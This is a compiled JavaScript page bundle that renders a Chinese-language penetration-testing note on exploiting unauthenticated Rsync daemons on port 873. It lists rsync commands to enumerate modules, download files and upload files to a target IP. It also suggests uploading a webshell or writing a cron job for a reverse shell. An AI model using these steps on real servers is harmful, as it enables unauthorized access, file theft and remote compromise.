(window.webpackJsonp=window.webpackJsonp||[]).push([[135],{1003:function(s,t,a){s.exports=a.p+"assets/img/1629296857028-f953fc8d-8b00-4ec7-93ac-89d22938faba.b5422b9f.png"},1004:function(s,t,a){s.exports=a.p+"assets/img/1629296903271-be04441e-f7be-4bb8-b1e6-c6e2fb5556f9.028951c7.png"},1005:function(s,t,a){s.exports=a.p+"assets/img/1629297071728-8c831f5b-1de2-4a94-8809-964689e8b419.28eccb9d.png"},2428:function(s,t,a){"use strict";a.r(t);var e=a(75),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,e=s._self._c||t;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"rsync-873端口"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#rsync-873端口"}},[s._v("#")]),s._v(" Rsync 873端口")]),s._v(" "),e("h2",{attrs:{id:"关于"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#关于"}},[s._v("#")]),s._v(" 关于")]),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("Rsync为Linux下实现远程同步功能的软件，能同步更新两处计算机的文件及目录。")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("在同步文件时，可以保持源文件的权限、时间、软硬链接等附加信息。常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员；而开发人员安全意识薄弱、安全技能欠缺往往是导致rsync出现相关漏洞的根源。")]),e("br"),s._v(" "),e("a-checkbox",{attrs:{checked:""}},[s._v("rsync默认配置文件为/etc/rsyncd.conf，常驻模式启动命令rsync –daemon，启动成功后默认监听于TCP端口873，可通过rsync-daemon及ssh两种方式进行认证")]),e("br"),s._v(" "),e("h2",{attrs:{id:"攻击方法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#攻击方法"}},[s._v("#")]),s._v(" 攻击方法")]),s._v(" "),e("p",[s._v("与Rsync相关的几条命令")]),s._v(" "),e("div",{staticClass:"language-bash line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-bash"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" ip::                        "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 遍历可以同步的目录")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" ip::backup                  "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 遍历backup目录下可以同步的文件")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" -avz ip::文件路径 本地路径     "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 下载目录下文件")]),s._v("\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("rsync")]),s._v(" -avz 本地文件路径 ip::目标路径  "),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 上传文件")]),s._v("\n")])]),s._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[s._v("1")]),e("br"),e("span",{staticClass:"line-number"},[s._v("2")]),e("br"),e("span",{staticClass:"line-number"},[s._v("3")]),e("br"),e("span",{staticClass:"line-number"},[s._v("4")]),e("br")])]),e("h2",{attrs:{id:"连接目标"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#连接目标"}},[s._v("#")]),s._v(" 连接目标")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1003),alt:"img"}})]),s._v(" "),e("h2",{attrs:{id:"文件下载"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#文件下载"}},[s._v("#")]),s._v(" 文件下载")]),s._v(" "),e("p",[e("img",{attrs:{src:a(1004),alt:"img"}})]),s._v(" "),e("h2",{attrs:{id:"文件上传"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#文件上传"}},[s._v("#")]),s._v(" 文件上传")]),s._v(" "),e("a-alert",{attrs:{type:"success",message:"在权限高，且已知Web路径的情况下，可上传Webshell文件获取权限",description:"",showIcon:""}}),s._v(" "),e("br"),s._v(" "),e("p",[e("img",{attrs:{src:a(1005),alt:"img"}})]),s._v(" "),e("p",[s._v("在权限高，也可以写入定时文件反弹 Shell")])],1)}),[],!1,null,null,null);t.default=r.exports}}]);